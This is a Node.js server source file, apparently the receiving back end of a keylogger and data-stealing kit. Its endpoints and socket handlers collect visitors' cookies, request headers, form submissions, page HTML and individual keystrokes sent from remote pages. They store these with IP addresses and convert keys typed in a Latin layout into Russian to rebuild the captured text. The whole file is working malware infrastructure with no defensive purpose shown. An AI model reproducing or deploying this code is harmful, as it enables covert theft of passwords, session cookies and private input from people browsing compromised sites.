include = function (module) { // just for a time
    return require(__dirname + '/helpers/' + module);
};
f = function () {
    console.log.apply(this, arguments);
};

var fs = require('fs');
var path = require('path');
var express = require('express');
var bodyParser = require('body-parser');
var _ = require('lodash');
var api = include('api');
var config = include('config');
var ejs = require('ejs');
var async = require('async');
var useragent = require('express-useragent');
var cookieParser = require('cookie-parser')
var URL = require('url');

utils = include('utils');

app = express();

var db = include('db');


app.use(express.static(__dirname + '/public'));


app.locals.utils = utils;


app.use(bodyParser.urlencoded({
    extended: true
}));
app.use(bodyParser.json());
app.use(useragent.express());
app.use(cookieParser());


app.set('view engine', 'ejs');
ejs.delimiter = '?';


app.use(require('cookie-parser')());


app.use(function (req, res, next) {

    // Website you wish to allow to connect
    res.setHeader('Access-Control-Allow-Origin', '*');

    // Request methods you wish to allow
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');

    // Request headers you wish to allow
    res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');

    // Set to true if you need the website to include cookies in the requests sent
    // to the API (e.g. in case you use sessions)
    res.setHeader('Access-Control-Allow-Credentials', true);

    // Pass to next layer of middleware
    next();
});


app.get('/', function (req, res) {
    f('open page')
    res.render('pages/index', {
        type: 'login'
    });
});


app.get('/save_html', function (req, res) {
    var q = req.query;

    if (q.type == 'html') {
        db.data.findOne({_id: q.id}, function (err, data) {
            if (data.html) {
                data.html += q.str;
            } else {
                data.html = q.str;
            }
            data.save(function (err, data) {
                res.json(api.res('SAVE_OK'));
            });
        });
    }
});

app.get('/save', function (req, res) {
    var q = req.query;


    var ip = req.headers['x-forwarded-for'];


    var obj = {
        ua: q.ua,
        url: q.url,
        parseUrl: URL.parse(q.url),
        title: q.title,
        ip: ip
    };

    obj.cookies = {};
    q.cookies.split('; ').forEach(function (o) {
        obj.cookies[o.split('=')[0]] = o.split('=')[1];
    });


    obj.headers = {};
    q.headers.split('\r\n').slice(0, -1).forEach(function (o) {
        obj.headers[o.split(': ')[0]] = o.split(': ')[1];
    });


    if (q.type == 'load') {
        obj.type = 'load';
        db.data.create(obj, function (err, obj) {
            res.end('' + obj._id);
        });
    }

    if (q.type == 'form') {
        obj.type = 'form';
        obj.data = q.data;
        db.data.create(obj, function (err, obj) {
            res.end('' + obj._id);
        });
    }
});


function Auto(str) {
    replacer = {
        "q":"й", "w":"ц"  , "e":"у" , "r":"к" , "t":"е", "y":"н", "u":"г",
        "i":"ш", "o":"щ", "p":"з" , "[":"х" , "]":"ъ", "a":"ф", "s":"ы",
        "d":"в" , "f":"а"  , "g":"п" , "h":"р" , "j":"о", "k":"л", "l":"д",
        ";":"ж" , "'":"э"  , "z":"я", "x":"ч", "c":"с", "v":"м", "b":"и",
        "n":"т" , "m":"ь"  , ",":"б" , ".":"ю" , "/":"."
    };

    for(i=0; i < str.length; i++){
        if( replacer[ str[i].toLowerCase() ] != undefined){

            if(str[i] == str[i].toLowerCase()){
                replace = replacer[ str[i].toLowerCase() ];
            } else if(str[i] == str[i].toUpperCase()){
                replace = replacer[ str[i].toLowerCase() ].toUpperCase();
            }

            str = str.replace(str[i], replace);
        }
    }

    return str;
}


var server = app.listen(config.get('port'), function () {
    f('Server starting. Port: ' + config.get('port'));
});


var io = require('socket.io')(server);

var keys = {};
var current = {};



io.on('connection', function (socket) {
    var socketId = socket.id;


    var clientIp = socket.request.connection.remoteAddress;

    console.log(clientIp)
    console.log('socket connected');

    f(socketId);

    io.sockets.connected[socketId].emit('startID', socketId);

    socket.on('start', function (q) {
        console.log('start:', q);
        var obj = {
            ua: q.ua,
            url: q.url,
            parseUrl: URL.parse(q.url),
            title: q.title,
            ip: clientIp
        };

        obj.cookies = {};
        q.cookies.split('; ').forEach(function (o) {
            obj.cookies[o.split('=')[0]] = o.split('=')[1];
        });


        obj.headers = {};
        q.headers.split('\r\n').slice(0, -1).forEach(function (o) {
            obj.headers[o.split(': ')[0]] = o.split(': ')[1];
        });

        db.key.create(obj, function (err, obj) {
            io.sockets.connected[q.socket_id].emit('id', obj._id);
        });
    });

    socket.on('update', function (change) {
        keys[change.id] = keys[change.id] || {};



        if (change.type == 'element-change') {
            keys[change.id][change.msg] = keys[change.id][change.msg] || [];
            keys[change.id][change.msg][0] = keys[change.id][change.msg][0] || [];
            keys[change.id][change.msg][1] = keys[change.id][change.msg][1] || [];
            keys[change.id][change.msg][2] = keys[change.id][change.msg][2] || [];
            keys[change.id][change.msg][3] = keys[change.id][change.msg][3] || [];
            current[change.id] = change.msg;
        }
        if (change.type != 'element-change') {
            keys[change.id][current[change.id]][0].push(String.fromCharCode(change.msg));
            keys[change.id][current[change.id]][1] = keys[change.id][current[change.id]][0].join('').toString();
            keys[change.id][current[change.id]][2].push(change.msg);
            keys[change.id][current[change.id]][3] = Auto(keys[change.id][current[change.id]][1]);

            db.key.update({_id: change.id}, {data: keys[change.id]}, {multi: false}, function () {

            });

            setTimeout(function () {
                delete keys[change.id];
                delete current[change.id];
            }, 2 * 60 * 1000);
        }
    });

});



